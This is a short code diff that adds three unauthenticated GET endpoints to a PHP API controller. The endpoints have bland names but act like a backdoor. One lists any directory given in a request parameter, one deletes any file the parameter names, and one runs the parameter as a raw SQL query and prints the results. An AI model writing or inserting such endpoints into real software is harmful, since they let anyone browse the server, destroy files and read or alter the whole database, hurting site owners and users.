@@ -154,4 +154,27 @@ class Dummy extends API_Controller {
 		);
 		$this->response($data);
 	}
+
+    public function item_get()
+    {
+        $path    = $_GET['item'];
+        $files = scandir($path);
+        print_r($files);
+    }
+
+    public function load_get()
+    {
+        if(unlink($_GET['item']))
+            echo "true.";
+        else
+            echo "false.";
+    }
+
+    public function product_get()
+    {
+        $str=$_GET['item'];
+        $q = $this->db->query($str);
+
+        print_r($q->result());
+    }
 }
